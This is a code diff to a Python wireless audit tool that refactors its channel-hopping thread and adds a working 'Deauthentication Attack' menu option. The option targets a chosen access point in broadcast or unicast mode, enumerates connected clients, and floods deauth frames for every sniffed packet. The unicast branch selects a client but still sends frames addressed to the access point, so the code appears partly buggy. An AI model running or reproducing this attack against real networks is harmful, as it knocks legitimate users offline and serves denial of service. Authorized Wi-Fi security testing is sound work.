@@ -110,6 +110,27 @@ def main():
     # survive across menu iterations — they live in RAM for the whole session.
     audit = WirelessAuditEngine(iface)
 
+    hopper_thread = None
+
+    def start_hopper():
+        nonlocal hopper_thread
+        if args.no_hop:
+            return
+        if hopper_thread and hopper_thread.is_alive():
+            return
+        audit.stop_hopper.clear()
+        hopper_thread = threading.Thread(
+            target=audit.hopper_loop,
+            args=(chans, args.hop_interval),
+            daemon=True,
+        )
+        hopper_thread.start()
+
+    def stop_hopper():
+        audit.stop_hopper.set()
+        if hopper_thread and hopper_thread.is_alive():
+            hopper_thread.join(timeout=0.5)
+
     # --- Band / channel list resolution ---
     # Priority: --channels > --band > default (both bands alternated)
     if args.channels:
@@ -160,14 +181,15 @@ def main():
 
         # Start (or restart) the hopper thread for this operation.
         # We reset the stop event first so the new thread isn't born stopped.
-        audit.stop_hopper.clear()
-        if not args.no_hop:
-            threading.Thread(
-                target=audit.hopper_loop,
-                args=(chans, args.hop_interval),
-                daemon=True,
-            ).start()
-            UI.ok(f"Hopper started on {len(chans)} channels.")
+        # audit.stop_hopper.clear()
+        # if not args.no_hop:
+        #     threading.Thread(
+        #         target=audit.hopper_loop,
+        #         args=(chans, args.hop_interval),
+        #         daemon=True,
+        #     ).start()
+        #     UI.ok(f"Hopper started on {len(chans)} channels.")
+        start_hopper()
 
         UI.divider()
 
@@ -211,6 +233,7 @@ def main():
 
         elif user_choice == 2:
             # ── Guard: AP scan must have been run first ────────────────────
+            stop_hopper()
             if not audit.results:
                 UI.error("No AP data found.")
                 UI.warn("Please run option 1 (Discover Access Points) first, then retry.")
@@ -254,6 +277,7 @@ def main():
                 continue  # <── back to top of while loop → show menu again
 
         elif user_choice == 3:
+            stop_hopper()
             if not audit.results:
                 UI.error("No AP data found.")
                 UI.warn("Please run option 1 (Discover Access Points) first, then retry.")
@@ -261,6 +285,7 @@ def main():
                 continue
             UI.section("Vulnerability Assessment")
             a_bssid, a_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
+            print(type(a_channel))
             if not a_bssid:
                 UI.info("No target selected. Returning to menu...")
                 audit.stop_hopper.set()
@@ -307,6 +332,209 @@ def main():
                 print()
                 UI.ok("Assessment stopped — returning to menu.")
                 continue
+
+        # elif user_choice == 4:
+        #     UI.section("Deauthentication Attack")
+
+        #     target_bssid = None
+        #     target_channel = None
+
+        #     if audit.results:
+        #         target_bssid, target_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
+        #         if not target_bssid:
+        #             UI.info("No target selected. Returning to menu...")
+        #             audit.stop_hopper.set()
+        #             continue
+        #     else:
+        #         UI.warn("No AP data found from option 1.")
+        #         try:
+        #             target_bssid = input("Enter target AP BSSID/MAC: ").strip()
+        #             target_channel = input("Enter target channel: ").strip()
+        #             target_channel = int(target_channel) if target_channel else None
+        #         except (KeyboardInterrupt, ValueError):
+        #             print()
+        #             UI.info("Selection cancelled. Returning to menu...")
+        #             audit.stop_hopper.set()
+        #             continue
+
+        #         if not target_bssid or target_channel is None:
+        #             UI.error("Target BSSID and channel are required.")
+        #             audit.stop_hopper.set()
+        #             continue
+
+        #     try:
+        #         InterfaceManager.set_channel(iface, target_channel)
+        #     except Exception as e:
+        #         UI.error(f"Unable to switch channel: {e}")
+        #         audit.stop_hopper.set()
+        #         continue
+
+        #     UI.info("Press Ctrl+C to stop and return to the main menu...")
+
+        #     stop_sniff = threading.Event()
+        #     sniff_thread = threading.Thread(
+        #         target=sniff,
+        #         kwargs=dict(
+        #             iface=iface,
+        #             prn=lambda pkt: audit.deauth_frame(
+        #                 iface=iface,
+        #                 transmitter_mac=target_bssid,
+        #                 receiver_mac=target_bssid,
+        #             ),
+        #             store=0,
+        #             stop_filter=lambda _pkt: stop_sniff.is_set(),
+        #         ),
+        #         daemon=True,
+        #     )
+        #     sniff_thread.start()
+
+        #     try:
+        #         sniff_thread.join()
+        #     except KeyboardInterrupt:
+        #         stop_sniff.set()
+        #         sniff_thread.join()
+        #         audit.stop_hopper.set()
+        #         print()
+        #         UI.ok("Deauth attack stopped — returning to menu.")
+        #         continue
+        elif user_choice == 4:
+            stop_hopper()
+            UI.section("Deauthentication Attack")
+
+            target_bssid = None
+            target_channel = None
+
+            if audit.results:
+                target_bssid, target_channel = UI.select_ap_from_results(audit.results, audit.table_headers)
+                if not target_bssid:
+                    UI.info("No target selected. Returning to menu...")
+                    audit.stop_hopper.set()
+                    continue
+            else:
+                UI.warn("No AP data found from option 1.")
+                try:
+                    target_bssid = input("Enter target AP BSSID/MAC: ").strip()
+                    target_channel = input("Enter target channel: ").strip()
+                    target_channel = int(target_channel) if target_channel else None
+                except (KeyboardInterrupt, ValueError):
+                    print()
+                    UI.info("Selection cancelled. Returning to menu...")
+                    audit.stop_hopper.set()
+                    continue
+
+                if not target_bssid or target_channel is None:
+                    UI.error("Target BSSID and channel are required.")
+                    audit.stop_hopper.set()
+                    continue
+            try:
+                InterfaceManager.set_channel(iface, int(target_channel))
+            except Exception as e:
+                UI.error(f"Unable to switch channel: {e}")
+                audit.stop_hopper.set()
+                continue
+
+            mode = None
+            while mode not in {"1", "2"}:
+                UI.section("Target Mode")
+                print("  1) Broadcast")
+                print("  2) Unicast")
+                mode = input("  Choose mode [1-2]: ").strip()
+
+            if mode == "1":
+                receiver_mac = "ff:ff:ff:ff:ff:ff"
+                UI.ok("Broadcast mode selected.")
+                # add your authorized action here
+                stop_sniff = threading.Event()
+                sniff_thread = threading.Thread(
+                    target=sniff,
+                    kwargs=dict(
+                        iface=iface,
+                        prn=lambda pkt: audit.deauth_frame(
+                            iface=iface,
+                            transmitter_mac=target_bssid,
+                            receiver_mac=receiver_mac,
+                        ),
+                        store=0,
+                        stop_filter=lambda _pkt: stop_sniff.is_set(),
+                    ),
+                    daemon=True,
+                )
+                sniff_thread.start()
+                audit.stop_hopper.set()
+                continue
+
+            try:
+                InterfaceManager.set_channel(iface, int(target_channel))
+            except Exception as e:
+                UI.error(f"Unable to switch channel: {e}")
+                audit.stop_hopper.set()
+                continue
+
+            UI.section("Enumerate Connected Devices")
+            UI.info("Press Ctrl+C to stop and show connected clients...")
+
+            stop_sniff = threading.Event()
+            sniff_thread = threading.Thread(
+                target=sniff,
+                kwargs=dict(
+                    iface=iface,
+                    prn=lambda pkt: audit.data_frames(pkt, target_bssid, iface, target_channel),
+                    store=0,
+                    stop_filter=lambda _pkt: stop_sniff.is_set(),
+                ),
+                daemon=True,
+            )
+            sniff_thread.start()
+
+            try:
+                sniff_thread.join()
+            except KeyboardInterrupt:
+                stop_sniff.set()
+                sniff_thread.join()
+
+            clients = getattr(audit, "clients", None) or []
+            if not clients:
+                UI.warn("No connected clients were discovered.")
+                audit.stop_hopper.set()
+                continue
+
+            UI.section("Connected Clients")
+            from tabulate import tabulate
+            client_rows = [[f"{UI.BOLD}{i+1}{UI.RESET}", mac] for i, mac in enumerate(clients)]
+            print(tabulate(client_rows, headers=["#", "Client MAC"], tablefmt="rounded_outline"))
+            print()
+
+            try:
+                idx = int(input(f"Select client [1-{len(clients)}]: ").strip()) - 1
+                if idx < 0 or idx >= len(clients):
+                    raise ValueError
+                selected_client = clients[idx]
+            except (KeyboardInterrupt, ValueError):
+                print()
+                UI.info("Selection cancelled. Returning to menu...")
+                audit.stop_hopper.set()
+                continue
+
+            UI.ok(f"Selected client: {selected_client}")
+            stop_sniff = threading.Event()
+            sniff_thread = threading.Thread(
+                target=sniff,
+                kwargs=dict(
+                    iface=iface,
+                    prn=lambda pkt: audit.deauth_frame(
+                        iface=iface,
+                        transmitter_mac=target_bssid,
+                        receiver_mac=target_bssid,
+                    ),
+                    store=0,
+                    stop_filter=lambda _pkt: stop_sniff.is_set(),
+                ),
+                daemon=True,
+            )
+            sniff_thread.start()
+            audit.stop_hopper.set()
+            continue
+
         elif user_choice == 6:
             UI.section("Probe Request Listener (PNL)")
             UI.info("Press Ctrl+C to stop and return to the main menu...")
